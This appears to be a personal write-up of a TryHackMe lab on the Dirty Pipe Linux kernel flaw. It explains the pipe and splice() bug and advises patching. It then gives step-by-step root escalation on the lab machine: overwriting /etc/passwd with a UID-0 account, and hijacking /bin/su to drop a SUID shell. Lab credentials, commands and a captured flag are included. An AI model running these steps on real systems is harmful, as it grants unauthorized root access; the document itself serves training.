---
This room will provide an overview of the vulnerability, as well as give you an opportunity to exploit it for yourself in the vulnerable machine attached to this task. We will start by taking a look at the vulnerability and exploit at a high-level
---

> Before continuing with this task, it is important to note that Dirty Pipe has been fixed in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102, so if you use or manage any Linux (or Android) devices, make sure that they are running a kernel greater than one of these versions!

`The smallest unit of memory controlled by the CPU is called a page — these are usually about 4Kib in modern systems. Of relevance to this room, pages are used when reading and writing files from the disk, although they have many other uses. The part of the kernel that manages pages is referred to as the page cache. `

==The vulnerability arises because of how the kernel implements *pipes*==

> You will likely be familiar with the idea of "anonymous pipes" — these are featured in most shell scripting languages and allow you to pass data between two processes, usually with the pipe character (|). Pipes are characterised as having two ends — one for reading, and one for writing

> the Linux kernel provides a system call called "splice()", which is effectively a shortcut designed to speed up the process of pushing the contents of a file into a pipe. This optimisation is achieved by moving references to the pages storing the file contents, rather than moving the entirety of the data. In other words, splice() allows us to point a pipe at a page which is already loaded into memory, containing a section of a file originally opened by a process requesting read-only access. 

==By splicing a page into the pipe then writing our own arbitrary data to the pipe, we can overwrite the contents of the page!==

> Usually when you write to a pipe after splicing a file, a new pipe_buffer is created to avoid overwriting the spliced data. So, how do we force the kernel to allow us to overwrite the relevant page(s)?
This is the real crux of the vulnerability, and it can all be traced back to two commits in the Linux kernel:

- A bug was introduced in Linux Kernel v4.9 (2016) which allowed pipes to be created with arbitrary flags. None of the flags available at the time were in any way dangerous, so this wasn't an issue, until...
- Linux Kernel v5.8 (2020) added a new flag — PIPE_BUF_FLAG_CAN_MERGE . In simple terms, this flag tells the kernel that the page can be updated without forcing a rewrite of the data.

> To summarise: we have a flag that allows us to tell the kernel that it's okay to overwrite the data in a page, we have a bug that allows us to specify arbitrary flags for a pipe, and we have a system call that inadvertently allows us to point pipes at page buffers which were opened as read-only. What could possibly go wrong?

> Put simply, the exploit first opens a target file with the read-only flag set — in order to do this, we must choose a file that we have permission to read. The exploit then prepares a pipe in a special way, forcing the addition of the PIPE_BUF_FLAG_CAN_MERGE flag. Next, it uses splice() to make the pipe point at the desired section of the target file. Finally, it writes whatever arbitrary data that the user has specified into the pipe, overwriting the target page by merit of the PIPE_BUF_FLAG_CAN_MERGE flag.

### The effects

> In short, it means that, with the right code, we can arbitrarily overwrite any file on the system, provided we can open it for reading. In other words: if our user has read access over the file (regardless of other permissions or mutability) then we can also write to it. Interestingly, this also applies to read-only file systems, or otherwise protected files which the kernel would usually stop us from writing to; by exploiting the kernel vulnerability and circumventing the "usual" write methods, we also bypass these protections. It's important to note that the changes will not actually be permanent until the kernel chooses to reclaim the memory used by the page (at which point the page gets dumped to the disk). Restarting the device or clearing the page cache manually before the kernel reclaims the memory will revert the file back to its original contents.

### Remediations

> Fortunately, the remediation for this vulnerability is very simple: *update your kernel*.
Patched versions of the Linux Kernel have been released for supported major kernel versions — specifically, the vulnerability has been patched in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102.
Ensure that you apply updates to all of your Linux devices (including any Android) as soon as security patches are released.

### A Weaponised PoC 

#### ssh

`tryhackme:TryHackMe123!`

```dirty-pipe
python3 -m http.server
```

```kali-machine
wget http://10.10.175.211:8000/poc.c
```

```kali-machine
wget http://10.10.175.211:8000/dirtypipez.c
```

> Bearing in mind that the exploit won't let us create files (we can only overwrite information in existing files), we first need to find a file our user can read, but that still allows us to elevate our privileges. The obvious easy choice in these conditions is /etc/passwd. Whilst password hashes are usually stored in the restricted-access /etc/shadow in modern Linux systems (as opposed to being stored traditionally in /etc/passwd), most Linux variants do still check to see if account password hashes are given in /etc/passwd. This means that we can write a user with root permissions and a known password hash directly into the passwd file!

##### The Passwd File

*Passwd entries are comprised of 7 fields, separated by colons (:). For example: root:x:0:0:root:/root:/bin/bash.

In order, these fields are:

    The username (root)
    The user's password hash. In most cases the hash will not actually be given here and instead will be replaced with an x. This means that the hash can instead be found in /etc/shadow.
    The user's UID (User ID) — as the root user, this is 0.
    The user's GID (Group ID). For the root user this will also be 0.
    A description of the account. This is simply "root" in the example, however, it can be left blank.
    The user's home directory (/root)
    The user's login shell (/bin/bash)

> If we can manually form our own entry (including a full password hash) and insert it into the passwd file then we can create a new user account. Interestingly, Linux doesn't check to confirm that the UID and GID of an account are unique — only that usernames are unique. In other words, we can create an account with our own unique username that has a UID and GID of 0, effectively giving our new account the same permissions as the root account!*

> Let's generate a password hash and form a valid passwd entry before moving on. Pick a password then use the openssl command to create a SHA512Crypt hash of your chosen password:

```
openssl passwd -6 --salt THM TryHackMe123!
```
`$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0`

`'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash'`

> We have our file (/etc/passwd) and our content (the passwd entry) — all we need now is the offset. The offset is where in the file the exploit should begin writing at — in other words, which part of the file gets overwritten.
The vulnerability won't allow us to append to the file, so we are going to have to pick an account and overwrite it. Realistically speaking, given the length of our passwd entry (hash inclusive), this will probably actually overwrite several accounts. Looking through the passwd file, the games account stands out as being a good candidate for a little-used account which we can afford to nuke for a few minutes. We can use grep with the -b switch to find the offset of games from the start of the file:

```offset
grep -b "games" /etc/passwd
```

> Before we perform the exploit, it's very important that we backup the /etc/passwd file. This is a disruptive exploit which will cause damage to the system (for a while at the very least); with the passwd file backed up, we can easily revert the damage after the exploit has been completed.
Use cp /etc/passwd /tmp/passwd to copy the passwd file to /tmp, then execute the exploit!

```
cp /etc/passwd /tmp/passwd
```

```
gcc poc.c -o exploit
```

`./exploit /etc/passwd 189 'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash`

`press enter/then '/in order to work`

```
su muiri
```

==enter pass TryHackMe123!==

> It worked!

```
cat /root/flag.txt
```

==THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}==

#### restoring the /etc/passwd file

```to see changes
cat /etc/passwd
```

```eliminate
rm -rf /etc/passwd
```

```backup
cp /tmp/passwd /etc/passwd
```

```checking
grep -b "muiri" /etc/passwd
```

###  A Second Exploit 

> Bl4sty's exploit capitalises on this. Instead of overwriting a file like /etc/passwd, it overwrites a user-specified SUID binary (such as /bin/su), injecting shellcode into it which then gets executed with the permissions of the privileged user (i.e. root). Specifically, the exploit hijacks the chosen SUID binary and forces it to create a backdoor binary in  /tmp which has the SUID bit and calls /bin/sh. It then restores the targeted SUID binary to full working order by re-adding the overwritten section, and uses the newly created backdoor to grant the attacker a shell as the privileged user.

#### Exploitation

> Before continuing with this task, please ensure that you have exited your session as the root user. You should once again be executing commands in the context of the tryhackme user.
As the tryhackme user, compile the exploit using the same syntax as was given in the previous task, e.g.

```
gcc dirtypipez.c -o exploit
```

> With the exploit compiled, it should be run with a single argument specifying a target binary, owned by root and with the SUID bit set, for example: 

```
./exploit /bin/su
```

> [+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))# whoami
root

`Remove the SUID binary created by the script (/tmp/sh).`

```
cd /tmp
```
```
ls
```
```
rm -rf sh
```
```checking
ls
```
==I understand the Dirty Pipe vulnerability!==









